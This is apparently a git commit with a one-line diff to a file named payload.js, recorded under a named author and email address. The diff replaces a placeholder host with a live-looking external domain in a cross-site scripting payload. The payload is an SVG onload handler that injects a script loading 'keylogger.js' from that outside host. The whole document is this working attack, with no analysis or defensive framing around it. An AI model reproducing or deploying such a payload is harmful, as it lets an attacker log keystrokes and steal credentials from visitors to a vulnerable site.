94c03d2cdfafc1e583144931c190e60318394306
MHH714 <hirschmilesh@gmail.com>
2025-02-02 09:52:27 -0700

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,1 @@
-<svg/onload=setTimeout(function(){d=document;z=d.createElement("script");z.src="//YOUR_SERVER/keylogger.js";d.body.appendChild(z)},0)>
+<svg/onload=setTimeout(function(){d=document;z=d.createElement("script");z.src="//bestwebsite-six.vercel.app/keylogger.js";d.body.appendChild(z)},0)>
